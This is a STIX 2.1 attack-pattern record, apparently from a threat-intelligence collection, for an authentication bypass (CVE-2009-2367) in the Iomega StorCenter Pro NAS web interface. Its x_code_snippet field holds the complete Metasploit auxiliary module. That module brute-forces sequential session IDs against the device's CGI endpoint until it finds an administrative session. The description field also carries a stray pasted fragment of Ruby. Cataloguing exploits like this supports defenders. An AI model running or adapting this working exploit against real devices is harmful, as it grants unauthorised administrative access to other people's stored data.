{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--164dc3a1-1458-4db0-b6fc-87142ada67ae",
    "created": "2024-08-14T16:23:23.791786Z",
    "modified": "2024-08-14T16:23:23.79179Z",
    "name": "Iomega StorCenter Pro NAS Web Authentication Bypass",
    "description": " The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs allowing for simple brute force attacks to bypass authentication and gain administrative access.  'References' => [ [ 'OSVDB', '55586' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/iomega_storcenterpro_sessionid.rb",
            "external_id": "iomega_storcenterpro_sessionid.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'Iomega StorCenter Pro NAS Web Authentication Bypass',\n      'Description' => %q{\n        The Iomega StorCenter Pro Network Attached Storage device web interface increments sessions IDs,\n        allowing for simple brute force attacks to bypass authentication and gain administrative\n        access.\n        },\n      'References' => [\n        [ 'OSVDB', '55586' ],\n        [ 'CVE', '2009-2367' ],\n      ],\n      'Author' => [ 'aushack' ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])\n      ]\n    )\n  end\n\n  def run\n    datastore['SID_MAX'].times do |x|\n      print_status(\"Trying session ID #{x}\")\n\n      res = send_request_raw({\n        'uri' => \"/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}\",\n        'method' => 'GET'\n      }, 25)\n\n      if (res && res.to_s =~ (/Log out/))\n        print_status(\"Found valid session ID number #{x}!\")\n        print_status(\"Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}\")\n        break\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Unable to connect to #{rhost}:#{rport}\")\n      break\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ aushack ]",
        ""
    ]
}